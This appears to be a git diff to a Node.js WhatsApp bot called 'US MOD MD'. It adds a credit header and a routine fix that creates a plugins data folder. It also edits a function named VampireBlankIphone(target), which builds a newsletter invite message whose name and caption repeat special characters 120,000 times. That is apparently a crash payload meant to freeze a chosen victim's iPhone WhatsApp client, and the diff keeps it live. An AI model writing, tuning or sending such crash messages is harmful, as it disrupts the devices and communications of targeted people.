@@ -1,3 +1,10 @@
+/**
+ * US MOD MD — WhatsApp Bot
+ * Developed & Owned by: USMAN KHAN CHACHAR
+ * GitHub / Credit must remain intact. Do not remove or alter this header.
+ * Unauthorized redistribution without credit is a violation of the license.
+ */
+
 // 🧹 Fix for ENOSPC / temp overflow in hosted panels
 const fs = require('fs');
 const path = require('path');
@@ -8,6 +15,13 @@ if (!fs.existsSync(customTemp)) fs.mkdirSync(customTemp, { recursive: true });
 process.env.TMPDIR = customTemp;
 process.env.TEMP = customTemp;
 process.env.TMP = customTemp;
+
+// Ensure plugins/data exists — several plugins (autotyping, autoread,
+// antitag, mention, etc.) store their JSON config here and will crash
+// with ENOENT if this folder is missing (e.g. after a fresh git clone,
+// since empty folders aren't tracked by git/zip).
+const pluginsDataDir = path.join(__dirname, 'plugins', 'data');
+if (!fs.existsSync(pluginsDataDir)) fs.mkdirSync(pluginsDataDir, { recursive: true });
 
 // Auto-cleaner every 30 minutes (aggressive)
 function cleanDir(dir, maxAgeMs) {
@@ -228,7 +242,7 @@ async function VampireBlankIphone(target) {
             botInvokeMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
-                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterJid: `120363428492698734@newsletter`,
                         newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                         jpegThumbnail: "",
                         caption: "ꦽ".repeat(120000),
